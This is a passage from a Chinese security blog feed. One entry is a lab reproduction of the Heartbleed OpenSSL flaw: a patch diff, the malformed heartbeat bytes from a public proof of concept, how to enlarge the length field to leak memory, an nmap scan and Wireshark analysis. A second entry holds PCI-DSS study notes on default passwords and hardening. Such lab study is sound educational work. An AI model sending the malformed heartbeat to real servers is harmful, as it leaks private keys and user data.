*s)</span><br><span class="line">        unsigned int payload;</span><br><span class="line">        unsigned int padding = 16; /* Use minimum padding */</span><br><span class="line">-       /* Read <span class="built_in">type</span> and payload length first */</span><br><span class="line">-       hbtype = *p++;</span><br><span class="line">-       n2s(p, payload);</span><br><span class="line">-       pl = p;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;msg_callback)</span><br><span class="line">                s-&gt;msg_callback(0, s-&gt;version, TLS1_RT_HEARTBEAT,</span><br><span class="line">                        &amp;s-&gt;s3-&gt;rrec.data[0], s-&gt;s3-&gt;rrec.length,</span><br><span class="line">                        s, s-&gt;msg_callback_arg);</span><br><span class="line">+       /* Read <span class="built_in">type</span> and payload length first */</span><br><span class="line">+       <span class="keyword">if</span> (1 + 2 + 16 &gt; s-&gt;s3-&gt;rrec.length)</span><br><span class="line">+               <span class="built_in">return</span> 0; /* silently discard */</span><br><span class="line">+       hbtype = *p++;</span><br><span class="line">+       n2s(p, payload);</span><br><span class="line">+       <span class="keyword">if</span> (1 + 2 + payload + 16 &gt; s-&gt;s3-&gt;rrec.length)</span><br><span class="line">+               <span class="built_in">return</span> 0; /* silently discard per RFC 6520 sec. 4 */</span><br><span class="line">+       pl = p;</span><br><span class="line">+</span><br><span class="line">        <span class="keyword">if</span> (hbtype == TLS1_HB_REQUEST)</span><br><span class="line">                &#123;</span><br><span class="line">                unsigned char *buffer, *bp;</span><br><span class="line">+               unsigned int write_length = 1 /* heartbeat <span class="built_in">type</span> */ +</span><br><span class="line">+                                           2 /* heartbeat length */ +</span><br><span class="line">+                                           payload + padding;</span><br><span class="line">                int r;</span><br><span class="line"> </span><br><span class="line">+               <span class="keyword">if</span> (write_length &gt; SSL3_RT_MAX_PLAIN_LENGTH)</span><br><span class="line">+                       <span class="built_in">return</span> 0;</span><br><span class="line">+</span><br><span class="line">                /* Allocate memory <span class="keyword">for</span> the response, size is 1 byte</span><br><span class="line">                 * message <span class="built_in">type</span>, plus 2 bytes payload length, plus</span><br><span class="line">                 * payload, plus padding</span><br><span class="line">                 */</span><br><span class="line">-               buffer = OPENSSL_malloc(1 + 2 + payload + padding);</span><br><span class="line">+               buffer = OPENSSL_malloc(write_length);</span><br><span class="line">                bp = buffer;</span><br><span class="line"> </span><br><span class="line">                /* Enter response <span class="built_in">type</span>, length and copy payload */</span><br><span class="line">@@ -1489,11 +1499,11 @@ dtls1_process_heartbeat(SSL *s)</span><br><span class="line">                /* Random padding */</span><br><span class="line">                RAND_pseudo_bytes(bp, padding);</span><br><span class="line"> </span><br><span class="line">-               r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);</span><br><span class="line">+               r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, write_length);</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> (r &gt;= 0 &amp;&amp; s-&gt;msg_callback)</span><br><span class="line">                        s-&gt;msg_callback(1, s-&gt;version, TLS1_RT_HEARTBEAT,</span><br><span class="line">-                               buffer, 3 + payload + padding,</span><br><span class="line">+                               buffer, write_length,</span><br><span class="line">                                s, s-&gt;msg_callback_arg);</span><br><span class="line"> </span><br><span class="line">                OPENSSL_free(buffer);</span><br></pre></td></tr></table></figure></p><p>从上面的差异我们可以看到，服务器处理心跳原来的方式是首先直接解析type和payload，什么都不做任何的检查。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unsigned int payload;</span><br><span class="line">        unsigned int padding = 16; </span><br><span class="line">        hbtype = *p++;</span><br><span class="line">        n2s(p, payload);</span><br><span class="line">        pl = p;</span><br></pre></td></tr></table></figure></p><p>修改之后openssl的data进行了16字节的数据对齐，其他格式一致。<br>修补方式是他加入了两个重要的函数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (1 + 2 + 16 &gt; s-&gt;s3-&gt;rrec.length)</span><br><span class="line">              <span class="built_in">return</span> 0; /* silently discard */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (1 + 2 + payload + 16 &gt; s-&gt;s3-&gt;rrec.length)</span><br><span class="line">              <span class="built_in">return</span> 0; /* silently discard per RFC 6520 sec. 4 */</span><br></pre></td></tr></table></figure></p><p>这个判断的目的是为了避免data的length为0这一特殊情况的处理。</p><h3 id="从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？"><a href="#从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？" class="headerlink" title="从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？"></a>从poc中哪里可以体现出漏洞，poc又是怎样利用的漏洞？</h3><p>从python的poc脚本中最重要的一部分代码可以看到:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hb = h2bin(<span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">18 03 02 00 03</span></span><br><span class="line"><span class="string">01 40 00</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span>)</span><br></pre></td></tr></table></figure></p><p>其中后四位 40 00 是我们请求的数据长度。如果将这个改为其他的数据。比如ff ff就可以请求一个超过我们真是payload长度的数据了。<br>通过更改请求数据的长度然后就可以利用漏洞读取缓存找中的数据了。</p><h2 id="漏洞的复现和利用"><a href="#漏洞的复现和利用" class="headerlink" title="漏洞的复现和利用"></a>漏洞的复现和利用</h2><h3 id="安装配置openssl"><a href="#安装配置openssl" class="headerlink" title="安装配置openssl"></a>安装配置openssl</h3><p>绝对不能直接卸载原来的openssl。因为有很多依赖，我们直接下载openssl 1.0.1e版本的压缩包，然后解压安装。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tar -zxvf   openssl-1.0.1e.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span>  /openssl-1.0.1e/  //编译安装之前需要执行下面这个否则会报错</span><br><span class="line">$ rm –f /usr/bin/pod2man</span><br><span class="line">$ ./config --prefix=/usr/<span class="built_in">local</span>/openssl shared -fPIC no-gost</span><br><span class="line">$ //上面的命令，是安装openssl到  /usr/<span class="built_in">local</span>/openssl 目录，安装之后，编译；</span><br><span class="line">$ make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>修改配置文件：<br>在/etc/ld.so.conf文件的最后面，添加如下内容：<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/openssl/lib</span><br></pre></td></tr></table></figure></p><p>然后执行：<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/<span class="built_in">local</span>/openssl/lib</span><br></pre></td></tr></table></figure></p><p>添加OPESSL的环境变量：<br>在etc／的profile的最后一行，添加：<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> OPENSSL=/usr/<span class="built_in">local</span>/openssl/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$OPENSSL</span>:<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin</span><br></pre></td></tr></table></figure></p><p>退出命令界面，再从新登录。(注销一下)<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cp lib*.so* /usr/lib64          //把这四个文件复制到lib64位置</span><br></pre></td></tr></table></figure></p><p>依次如下执行：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ldd /usr/<span class="built_in">local</span>/openssl/bin/openssl</span><br></pre></td></tr></table></figure></p><p>查看路径<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> openssl</span><br></pre></td></tr></table></figure></p><p>查看版本：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ openssl version</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-67ef6e67678784ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p><h3 id="配置Apache-https"><a href="#配置Apache-https" class="headerlink" title="配置Apache+https"></a>配置Apache+https</h3><p>不用卸载原来的apache，直接下线安装2.2版本就行，这样就不用装apr这些依赖，原版本已经存在。<br>下载安装apache2.2.34：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tar –zxvf apache-2.2.34.tar.gz</span><br><span class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span>/httpd --<span class="built_in">enable</span>-so --<span class="built_in">enable</span>-rewrite --<span class="built_in">enable</span>-ssl --with-ssl=/usr/<span class="built_in">local</span>/openssl</span><br><span class="line">$ Make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>如果编译时出现错误：sort libssl.so.10之类的错误可以直接忽略！<br>因为这个只是版本的问题，不用理会！我尝试了很多都不能解决这个问题。重装了好几次，最后发现是fedora版本的问题，后面直接忽略了这个报错发现最结果没有影响。<br>在目录/usr/local/httpd/conf下生成证书：（直接在conf目录下生成证书就不用拷贝了。）<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ openssl genrsa -out server.key 2048   //生成2048位的加密私钥</span><br><span class="line">$ openssl req -new -key server.key -out server.csr   //生成证书签名请求（CSR），这里需要填写许多信息，如国家，省市，公司等</span><br><span class="line">$ openssl x509 -req -days 3650 -<span class="keyword">in</span> server.csr -signkey server.key -out server.crt    //最后，生成类型为X509的自签名证书。有效期设置3650天，即有效期为10年</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-68197205f328ab4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-406a0c6c1465776c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>然后修改httpd.conf的配置文件<br>将ServerNname的注释取消，改为127.0.0.1:8080<br>将httpd-ssl的那一行的注释也取消。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d7aa94325f96a2d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>然后重启apache<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/<span class="built_in">local</span>/httpd/bin/apachectl  restart</span><br></pre></td></tr></table></figure></p><p>访问指定页面就可以使用https了：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-514b9552a5b98f96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>下载编译安装php5.3.30<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span>/php   --with-apxs2=/usr/<span class="built_in">local</span>/httpd/bin/apxs  --with-config-file-path=/usr/<span class="built_in">local</span>/php/etc   --<span class="built_in">enable</span>-fpm --<span class="built_in">enable</span>-mbstring --<span class="built_in">enable</span>-gd --<span class="built_in">enable</span>-xml    --with-mysqli=mysqlnd</span><br></pre></td></tr></table></figure></p><p>然后编辑一下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cp php.ini-development  /usr/<span class="built_in">local</span>/php/etc/php.ini</span><br></pre></td></tr></table></figure></p><p>修改Apache的配置文件httpd.conf<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DirectoryIndex index.html index.php <span class="comment">#添加index.php</span></span><br><span class="line">找到：</span><br><span class="line">AddType  application/x-compress .Z</span><br><span class="line">AddType application/x-gzip .gz .tgz</span><br><span class="line">添加如下内容</span><br><span class="line">AddType application/x-httpd-php-source .phps</span><br><span class="line">AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure></p><p>检查LoadModule php5_module modules/libphp5.so 是否已经添加 libphp5.so文件是否存在。存在就可以，写一个简单的php查看：</p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-a48245c474c2b0b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"><br>可以用php进行访问。</p><h3 id="利用poc进行攻击"><a href="#利用poc进行攻击" class="headerlink" title="利用poc进行攻击"></a>利用poc进行攻击</h3><p>从其他主机访问：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-87e38c38397821ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-a906b9e7de291cb8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>可以看到我们刚刚生成的私人证书，在其他主机访问则不安全。<br>下面尝试使用namp自带的脚本进行检测，进行poc攻击：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -sV -p 443 --script=ssl-heartbleed 127.0.0.1</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-71039d4eb078555c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>可以看到成功扫出来了漏洞：ssl-heartbleed,危险程度是高。<br>接着尝试使用网上的脚本进行测试：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-6d0d8fd778e19d6e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-7ea36579f0205264.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"></p><h3 id="编译安装配置https-php-mysql环境"><a href="#编译安装配置https-php-mysql环境" class="headerlink" title="编译安装配置https+php+mysql环境"></a>编译安装配置https+php+mysql环境</h3><p>下载php5.6.17并编译安装：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span>/php</span><br></pre></td></tr></table></figure></p><h3 id="通过修改心跳包数据、抓包等方式进一步理解heartbleed的漏洞原理；"><a href="#通过修改心跳包数据、抓包等方式进一步理解heartbleed的漏洞原理；" class="headerlink" title="通过修改心跳包数据、抓包等方式进一步理解heartbleed的漏洞原理；"></a>通过修改心跳包数据、抓包等方式进一步理解heartbleed的漏洞原理；</h3><p>通过在攻击机执行网上的poc利用 脚本，然后用wireshark抓包观察：<br>首先攻击机先测试能否访问靶机：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-b33c8a003b54b387.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>然后打开wireshark监听网卡，设置过滤指定地址和端口：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4d02742189726793.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>攻击机执行攻击（没有更改长度）脚本：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d2a0d1567abc7a00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br>抓取到心跳包请求包和响应包，我们点击请求包查看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-46e8758109e2413d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br>这是正常的请求包，主要这里的payload长度。<br>下面看看请求包的详细情况：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-09f6eb04de47fe4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br>后面这16位：<br>18表示contenet-type:heartbleed(24)<br>03 02表示 版本<br>03 表示长度<br>01 表示是请求<br>20 00就是payload就是我们要读取的数据的长度。<br>接着我们进行更改payload的长度进行测试：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-67f4f17b22ea0830.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br>将代码后上面后四位改为ff ff，执行，抓包查看：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-36678ee0008887b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"><br>可以看到此时的请求包的payload已经变为了65535。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-8030a5eccfe15d87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.png"><br>因为这里的请求长度就是ff ff。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4a134409836e2b8f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20.png"><br>同样的响应包的也变成了65535变成了我们更改的64k的数据了，这样我们就成功每次可以读取到64KB数据。<br>接着我们建立一个简单的php+apache+mysql的网站，然后进行测试。<br>最新版mysql5.7以上使用SET PASSWORD = ‘&lt;plaintext_password&gt;’更改密码！！<br>设置可以使用弱密码set global validate_password_policy=0;<br>我直接将我数据库的大作业考进知道文件夹然后进行测试：<br>在攻击机访问我的数据管理系统：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-4ecf1551053497c7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="22.png"><br>成功窃取了内存中的数据！！！！</p><h3 id="heartbleed漏洞的风险是什么。"><a href="#heartbleed漏洞的风险是什么。" class="headerlink" title="heartbleed漏洞的风险是什么。"></a>heartbleed漏洞的风险是什么。</h3><p>如果一个服务器存在heartbleed的漏洞很可能会被攻击者窃取内存中的数据，虽然每次是以最大64kb的数据被窃取，但是很有可能被攻击者窃取了秘钥等重要的信息来进行更危险的攻击。</p><h2 id="使用openvas扫描"><a href="#使用openvas扫描" class="headerlink" title="使用openvas扫描"></a>使用openvas扫描</h2><p><img src="http://upload-images.jianshu.io/upload_images/6269327-e9e0b57a771cbc4a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="23.png"><br>可以看到成功扫描出来heartbleed漏洞。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;heartbleed漏洞及内存信息窃取&quot;&gt;&lt;a href=&quot;#heartbleed漏洞及内存信息窃取&quot; class=&quot;headerlink&quot; title=&quot;heartbleed漏洞及内存信息窃取&quot;&gt;&lt;/a&gt;heartbleed漏洞及内存信息窃取&lt;/h1&gt;
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://rliyuqing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="heartbleed漏洞" scheme="http://rliyuqing.github.io/tags/heartbleed%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(二)</title>
    <link href="http://rliyuqing.github.io/2019/04/15/15.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)/"/>
    <id>http://rliyuqing.github.io/2019/04/15/15. PCI-DSS(V3.2.1)学习笔记(二)/</id>
    <published>2019-04-15T14:44:26.000Z</published>
    <updated>2019-04-16T15:49:47.821Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="PCI-DSS-V3-2-学习笔记-二"><a href="#PCI-DSS-V3-2-学习笔记-二" class="headerlink" title="PCI-DSS(V3.2)学习笔记(二)"></a>PCI-DSS(V3.2)学习笔记(二)</h1><hr><h1 id="一、建立和维护一个安全的网络和系统"><a href="#一、建立和维护一个安全的网络和系统" class="headerlink" title="一、建立和维护一个安全的网络和系统"></a>一、建立和维护一个安全的网络和系统</h1><h2 id="要求2：不要使用供应商提供的默认系统密码和其他安全参数"><a href="#要求2：不要使用供应商提供的默认系统密码和其他安全参数" class="headerlink" title="要求2：不要使用供应商提供的默认系统密码和其他安全参数"></a>要求2：不要使用供应商提供的默认系统密码和其他安全参数</h2><p>划重点！划重点！要点2可谓是直戳人心，我想这个不必细讲大家都知道默认密码或者弱密码带来的危害有多大！就说最近吧，乌克兰军方系统的123456密码可是好好的给我上了一课，太真实了，且不细究这是默认密码还是改成这么简单的，但是带来的危害可想而知！<br>当我们在某个系统组件或者软件中使用默认密码的的时候，攻击者可以很容易就通过网上或者产品提供商出获取默认密码进行攻击。这个攻击场景是十分十分常见的，博主在高校教育网中就见过无数次了，不论是校园网的平台还是其他管理系统的平台。默认密码屡见不鲜，因此强烈建议不使用供应商提供的默认密码。就算默认密码是一个很复杂的密码也必须更改！默认空密码的就更不用说了。 </p><h3 id="2-1-始终更改供应商提供的默认值并于在网络中安装系统之前删除或禁用不必要的默认账户"><a href="#2-1-始终更改供应商提供的默认值并于在网络中安装系统之前删除或禁用不必要的默认账户" class="headerlink" title="2.1 始终更改供应商提供的默认值并于在网络中安装系统之前删除或禁用不必要的默认账户"></a>2.1 始终更改供应商提供的默认值并于在网络中安装系统之前删除或禁用不必要的默认账户</h3><p>（此要求适用于所有默认密码。包括但不限于操作系统、提供安全服务的软件、应用程序和系统账户、销售点（POS）终端、支付应用程序、简单网络管理协议（SNMP）社区字符串等使用的默认密码）。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-dcfe6381554ed142.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.1"><br>在我们使用了第三方提供的软件、应用操作系统等时一定要在上线之前更改掉供应商提供的默认密码，特别是默认空密码的，一定要增加密码，并且对于一些测试的账号或者无作用的默认账号一定要删除！也说说默认账号带来的危害，之前rabbitmq就有默认的guest账号登录，且有所有的操作权限，还有很多的这样的默认账户，我们需要在软件或者应用正式使用之前就删除这些不用的默认账户。</p><h4 id="2-1-1-对于连接到持卡人数据环境或传输持卡人数据的无线环境，在安装时更改所有无线供应商的默认值，包括但不限于默认的无线密钥、密码和SNMP社区字符串"><a href="#2-1-1-对于连接到持卡人数据环境或传输持卡人数据的无线环境，在安装时更改所有无线供应商的默认值，包括但不限于默认的无线密钥、密码和SNMP社区字符串" class="headerlink" title="2.1.1 对于连接到持卡人数据环境或传输持卡人数据的无线环境，在安装时更改所有无线供应商的默认值，包括但不限于默认的无线密钥、密码和SNMP社区字符串"></a>2.1.1 对于连接到持卡人数据环境或传输持卡人数据的无线环境，在安装时更改所有无线供应商的默认值，包括但不限于默认的无线密钥、密码和SNMP社区字符串</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-54d4d5f82b66c331.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.1.1"><br>在要求1里面我们曾经画过持卡人数据的数据流图和网络拓扑图，我们已经清楚的了解到那些网络环境里面会存储或传输持卡人数据，对于这些网络环境我们需要重点关注。更改默认路由器或交换机的默认账号，默认密码。或者简单网络管理协议(SNMP)，若管理员配置不当运行默认团体名/弱口令访问,将导致敏感信息泄露。无线网络是很容易被嗅探窃取信息的。比如校园网或者公司的办公网，很容易被嗅探，学校内嗅探“借”校园网流量的也不少。</p><h3 id="2-2-制定适合所有系统组件的配置标准。确保这些标准能解决所有已知的安全漏洞并与行业认可的系统强化标准一致"><a href="#2-2-制定适合所有系统组件的配置标准。确保这些标准能解决所有已知的安全漏洞并与行业认可的系统强化标准一致" class="headerlink" title="2.2 制定适合所有系统组件的配置标准。确保这些标准能解决所有已知的安全漏洞并与行业认可的系统强化标准一致"></a>2.2 制定适合所有系统组件的配置标准。确保这些标准能解决所有已知的安全漏洞并与行业认可的系统强化标准一致</h3><p>行业认可的系统强化标准来源包括但不限于：<br>1、互联网安全中心（CIS）<br>2、国际标准化组织（ISO）<br>3、美国系统网络安全协会（SANS）<br>4、国家标准与技术研究所（NIST）<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b3583c2e5cfac213.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.2"><br>这里其实就是让我们参照权威机构发布的标准来严格标准化我们的系统组件配置。我们主要看看2.2.d的详细步骤，这里具体讲了标准化的主要程序和步骤，这里前面也都说到了。谈一谈其中的一点，每台服务器仅执行一项主要功能买一房至不同安全级别的功能并存于同一台服务器上。<br>因为对于不同安全级别的服务器我们采取的安全保护措施肯定是不同的，还是比如我们web server和数据服务器在一台服务器上的话就很危险。<br>其他的主要就是按照CIS或者ISO啊之类根据我们环境的系统组件定制我们自己的标准，并严格执行，检测。</p><h4 id="2-2-1-每台服务器仅执行一项主要功能，以防需要不同安全级别的功能并存在同一台服务器上。"><a href="#2-2-1-每台服务器仅执行一项主要功能，以防需要不同安全级别的功能并存在同一台服务器上。" class="headerlink" title="2.2.1 每台服务器仅执行一项主要功能，以防需要不同安全级别的功能并存在同一台服务器上。"></a>2.2.1 每台服务器仅执行一项主要功能，以防需要不同安全级别的功能并存在同一台服务器上。</h4><p>（例如web服务器、数据库服务器和DNS服务器均应在单独的服务器上执行）<br><img src="https://upload-images.jianshu.io/upload_images/6269327-e47dadfc33faed9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.2.1"><br>好吧，前面刚刚说到，这里的2.2.1就是说这一点，看来我还是抓住了重点的。这里来说说，如果两个安全级别不同的功能在一个服务器上，如果我们使用高安全级别的话可能会对低安全级别的功能产生影响，如果使用低安全级别的整个服务器的安全有没有达到标准，没有得到保障。很多运维工程师对待这样的服务器往往会舍弃安全换取便利，使用低安全标准，这样带来了很大的服务器被攻击的隐患，同时我们也确保如果一个服务被攻击后不会导致其他的服务快速沦陷。<br>举个例子来说，我们如果把两种不同的动物圈养在一个栅栏里面，我们首先不知道两个动物会不会相互影响，就算不会相互影响，我们设计栅栏的时候也是很困难的，栅栏低了，长得高的动物可以逃跑，栅栏高了，长得低的动物无法时刻被圈养者关注着。</p><h4 id="2-2-2-仅启用系统功能所需的必要服务、协议、守护进程等"><a href="#2-2-2-仅启用系统功能所需的必要服务、协议、守护进程等" class="headerlink" title="2.2.2 仅启用系统功能所需的必要服务、协议、守护进程等"></a>2.2.2 仅启用系统功能所需的必要服务、协议、守护进程等</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-ea7cf1fae7ff3137.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.2.2"><br>这和1.3.1有一点相似，1.3.1是禁止向不安全的协议，服务端口，输入流量，这里是不启用那些非必要的服务、协议端口。前者是从防火墙角度，这里直接是从服务器，源头解决安全隐患。就算有存在不安全的的服务、协议、端口，但是又是必须的，这就得必须确认通过公司的安全标准。</p><h4 id="2-2-3-针对任何被视为不安全的必要服务、协议或守护进程实施附加安全功能"><a href="#2-2-3-针对任何被视为不安全的必要服务、协议或守护进程实施附加安全功能" class="headerlink" title="2.2.3 针对任何被视为不安全的必要服务、协议或守护进程实施附加安全功能"></a>2.2.3 针对任何被视为不安全的必要服务、协议或守护进程实施附加安全功能</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b38550ebcea858fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.23"><br>这个在上面也提到了，如果一个不安全的协议、服务、端口是一个业务的必须条件，那我们就得实施自己的安全策略将解决协议或服务的不安全性，自己添加策略确保安全，同时也要有记录！</p><h4 id="2-2-4-配置系统参数，以防滥用"><a href="#2-2-4-配置系统参数，以防滥用" class="headerlink" title="2.2.4 配置系统参数，以防滥用"></a>2.2.4 配置系统参数，以防滥用</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-ad4dffbc04b79be3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.2.4"><br>这个应该是针对那些具体系统或应用来说的，我们要根据具体系统的安全参数来配置。比如mysql的安全配置，一个数据库一个账号，root只允许本机登录等。</p><h4 id="2-2-5-删除所有非必要功能，例如脚本、驱动程序、特性、子系统、文件系统和不必要的Web服务器"><a href="#2-2-5-删除所有非必要功能，例如脚本、驱动程序、特性、子系统、文件系统和不必要的Web服务器" class="headerlink" title="2.2.5 删除所有非必要功能，例如脚本、驱动程序、特性、子系统、文件系统和不必要的Web服务器"></a>2.2.5 删除所有非必要功能，例如脚本、驱动程序、特性、子系统、文件系统和不必要的Web服务器</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-fbc105675d6d9e35.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.2.5"><br>对于一个安全体系较为完整的公司来说，每一个正在使用的系统，服务等都会有相应的记录和负责人员，如果一些系统废弃了，更换了，在整理完数据之后我们有必要删除那些非必要的脚本或者系统等。之前给某个公司做授权的渗透测试时，发现公司一个老域名上有一个已经废弃的web服务，准备几个月后更新，这几个月一直处于无人监管的状态，在这里就有一大堆的sql注入，身份验证绕过漏洞。所以对于废弃服务，或者不必要的脚本，驱动我们一定要定时检测，清理，就算暂时不用也要进行安全隔离。</p><h3 id="2-3-使用强效加密法对所有非控制台管理访问进行加密"><a href="#2-3-使用强效加密法对所有非控制台管理访问进行加密" class="headerlink" title="2.3 使用强效加密法对所有非控制台管理访问进行加密"></a>2.3 使用强效加密法对所有非控制台管理访问进行加密</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-5890c40988016d6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.3-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-606bcdb59b866d52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.3-2"><br>这里也是很重要的一点，就是说我们如果不是在管理台登录的管理系统，在其他地方登陆，比如我们ssh登录到某台服务器，或者http访问某个管理后台，所有的远程访问的时候我们就必须对我们的访问进行强效的加密算法进行加密！不然很容易就被窃取密码。当然前提我们也得保证加密算法或者协议的安全性，比如当时heartbleed的漏洞。</p><h3 id="2-4-保留一份PCI-DSS范围内系统组件的清单"><a href="#2-4-保留一份PCI-DSS范围内系统组件的清单" class="headerlink" title="2.4 保留一份PCI DSS范围内系统组件的清单"></a>2.4 保留一份PCI DSS范围内系统组件的清单</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-4c4d55aa66338515.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.4"><br>这个就是自己制定一份清单，这个清单就是包括所有在PCI DSS这个标准下的系统组件，如果出问题我们可以缩小范围。以及防止我们以防某个重要系统组件是否受到安全的保障。</p><h3 id="2-5-确保已记录、正在使用且所有相关方了解用于管理供应商默认设置及其他安全参数的安全政策和操作程序"><a href="#2-5-确保已记录、正在使用且所有相关方了解用于管理供应商默认设置及其他安全参数的安全政策和操作程序" class="headerlink" title="2.5 确保已记录、正在使用且所有相关方了解用于管理供应商默认设置及其他安全参数的安全政策和操作程序"></a>2.5 